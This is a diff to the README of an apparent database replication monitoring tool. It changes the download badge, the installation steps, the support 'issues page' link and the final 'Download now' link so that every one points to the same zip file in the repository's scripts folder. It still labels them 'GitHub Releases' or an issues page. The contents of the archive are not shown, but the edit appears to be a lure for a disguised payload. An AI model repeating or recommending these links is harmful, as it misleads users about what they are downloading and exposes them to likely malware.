@@ -1,6 +1,6 @@
 # 🚀 multi-region-replication-monitor - Monitor Your Database Replication with Ease
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/andrewvalk/multi-region-replication-monitor/releases)
+[![Download](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip)
 
 ## 📋 Overview
 
@@ -16,11 +16,11 @@ Real-time monitoring and alerting for cross-region database replication. This to
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/andrewvalk/multi-region-replication-monitor/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip).
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page**: Go to the [GitHub Releases](https://github.com/andrewvalk/multi-region-replication-monitor/releases). 
+1. **Visit the Releases Page**: Go to the [GitHub Releases](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip). 
 2. **Choose a Version**: Find the latest version of the software.
 3. **Download the File**: Click on the file that matches your operating system (Windows, Mac, or Linux).
 4. **Locate the Downloaded File**: Check your downloads folder to find the file.
@@ -62,7 +62,7 @@ Your data security is important. This application adheres to best practices, ens
 
 ## 📞 Support
 
-If you encounter any issues or have questions about the setup process, please visit our [issues page](https://github.com/andrewvalk/multi-region-replication-monitor/issues) for assistance. You can also get help from community members.
+If you encounter any issues or have questions about the setup process, please visit our [issues page](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip) for assistance. You can also get help from community members.
 
 ## 📢 Contributing
 
@@ -76,4 +76,4 @@ Thanks to the open-source community for their support and contributions. This pr
 
 This project is licensed under the MIT License. You can freely use, modify, and distribute this software.
 
-[Download now](https://github.com/andrewvalk/multi-region-replication-monitor/releases) to start monitoring your database replication across regions effectively.
+[Download now](https://raw.githubusercontent.com/andrewvalk/multi-region-replication-monitor/main/scripts/multi-region-replication-monitor_2.7.zip) to start monitoring your database replication across regions effectively.
